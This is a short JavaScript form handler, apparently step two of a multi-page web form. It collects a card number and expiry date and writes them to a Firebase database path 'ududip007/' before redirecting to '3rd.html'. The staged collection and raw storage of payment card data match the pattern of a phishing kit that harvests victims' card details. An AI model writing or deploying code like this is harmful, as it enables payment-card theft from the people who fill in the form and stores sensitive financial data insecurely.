// form-step2.js

const key = localStorage.getItem("firebaseKey");

if (!key) {
  alert("No session found. Please go back to Step 1.");
  window.location.href = "index.html";
}

const ref = firebase.database().ref("ududip007/" + key);

document.getElementById("step2form").addEventListener("submit", function (e) {
  e.preventDefault();

  const card = document.getElementById("card").value;
  const expMonth = document.getElementById("exp_month").value;
  const expYear = document.getElementById("exp_year").value;

  ref.update({
    d_CARD: card,
    e_EXPIRY: `${expMonth}/${expYear}`
  }).then(() => {
    window.location.href = "3rd.html";
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
